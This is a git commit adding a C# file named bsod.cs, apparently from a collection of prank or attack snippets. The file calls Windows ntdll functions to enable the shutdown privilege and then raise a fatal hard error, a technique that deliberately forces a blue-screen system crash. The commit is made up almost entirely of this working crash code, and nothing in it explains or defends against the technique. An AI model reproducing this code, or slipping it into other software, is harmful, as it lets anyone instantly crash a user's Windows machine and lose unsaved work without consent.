10295aa15171965723035048a2effee75aec6c59
Tekish <64609867+HTekishH@users.noreply.github.com>
2022-03-06 19:07:56 +0100

    Create bsod.cs

---
+++ c-sharp/bsod.cs
@@ -0,0 +1,12 @@
+[DllImport("ntdll.dll")]
+public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
+
+[DllImport("ntdll.dll")]
+public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
+
+
+
+Boolean t1;
+uint t2;
+RtlAdjustPrivilege(19, true, false, out t1);
+NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
